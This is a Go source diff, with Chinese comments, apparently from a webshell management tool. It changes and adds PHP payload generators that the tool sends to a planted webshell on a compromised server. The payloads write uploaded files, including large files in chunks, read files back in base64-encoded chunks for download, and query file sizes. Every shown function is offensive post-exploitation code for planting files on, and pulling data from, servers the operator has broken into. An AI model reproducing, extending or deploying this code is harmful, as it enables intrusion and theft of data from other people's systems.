@@ -109,23 +109,137 @@ echo json_encode($directory);  `, path)
 	return []byte(code)
 }
 
-// 上传文件
+// 上传文件 - 简单上传，用于小文件
 func (p *PHPWebshell) Upload(path string, fileData string) []byte {
-	code := fmt.Sprintf(`$path = "%s"; 
-file_put_contents($path, %s);`, path, string(fileData))
+	code := fmt.Sprintf(`
+$path = "%s";
+$data = base64_decode("%s");
+
+if (file_put_contents($path, $data) !== false) {
+    echo "ok";
+} else {
+    echo "Error://[Failed to write file]";
+}`, path, fileData)
 	return []byte(code)
 }
 
-// 下载文件
-func (p *PHPWebshell) Download(path string) []byte {
-	code := fmt.Sprintf(`$path = "%s"; 
-if (file_exists($path)) {
-    echo file_get_contents($path);
+// 分块上传 - 用于大文件
+func (p *PHPWebshell) UploadChunk(path string, fileData string, chunkIndex int, totalChunks int) []byte {
+	code := fmt.Sprintf(`
+$path = "%s";
+$chunk = base64_decode("%s");
+$chunkIndex = %d;
+$totalChunks = %d;
+
+// 临时文件路径
+$tempPath = $path . ".tmp";
+
+// 写入分块数据
+if ($chunkIndex == 0) {
+    // 第一个分块，创建或覆盖文件
+    file_put_contents($tempPath, $chunk);
 } else {
-    echo "File not found.";
+    // 追加后续分块
+    file_put_contents($tempPath, $chunk, FILE_APPEND);
+}
+
+// 检查是否是最后一个分块
+if ($chunkIndex == $totalChunks - 1) {
+    // 所有分块已上传，重命名为最终文件
+    if (rename($tempPath, $path)) {
+        echo "ok";
+    } else {
+        echo "Error://[Failed to finalize file]";
+    }
+} else {
+    echo "chunk_ok";
+}`, path, fileData, chunkIndex, totalChunks)
+	return []byte(code)
+}
+
+// 下载文件 - 支持分块下载
+func (p *PHPWebshell) Download(path string) []byte {
+	code := fmt.Sprintf(`
+$path = "%s";
+
+if (!file_exists($path)) {
+    echo "Error://[File not found]";
+    exit;
+}
+
+$fileSize = filesize($path);
+$content = file_get_contents($path);
+
+if ($content === false) {
+    echo "Error://[Failed to read file]";
+    exit;
+}
+
+// 返回文件信息和base64编码的数据
+$response = array(
+    "fileSize" => $fileSize,
+    "data" => base64_encode($content)
+);
+
+echo json_encode($response);`, path)
+	return []byte(code)
+}
+
+// 为大文件提供的分块下载方法
+func (p *PHPWebshell) DownloadChunk(path string, offset int64, chunkSize int64) []byte {
+	code := fmt.Sprintf(`
+$path = "%s";
+$offset = %d;
+$chunkSize = %d;
+
+if (!file_exists($path)) {
+    echo "Error://[File not found]";
+    exit;
+}
+
+$fileSize = filesize($path);
+$handle = fopen($path, "rb");
+
+if ($handle === false) {
+    echo "Error://[Cannot open file]";
+    exit;
+}
+
+// 移动到指定偏移位置
+fseek($handle, $offset);
+
+// 读取指定大小的数据块
+$chunk = fread($handle, $chunkSize);
+fclose($handle);
+
+if ($chunk === false) {
+    echo "Error://[Failed to read chunk]";
+    exit;
+}
+
+// 返回文件信息和base64编码的数据块
+$response = array(
+    "fileSize" => $fileSize,
+    "offset" => $offset,
+    "chunkSize" => strlen($chunk),
+    "data" => base64_encode($chunk)
+);
+
+echo json_encode($response);`, path, offset, chunkSize)
+	return []byte(code)
+}
+
+// 获取文件大小
+func (p *PHPWebshell) GetFileSize(path string) []byte {
+	code := fmt.Sprintf(`
+$path = "%s";
+if (file_exists($path)) {
+    $size = filesize($path);
+    echo json_encode(array("size" => $size));
+} else {
+    echo "Error://[File not found]";
 }`, path)
 	return []byte(code)
-
 }
 
 // 读取文件
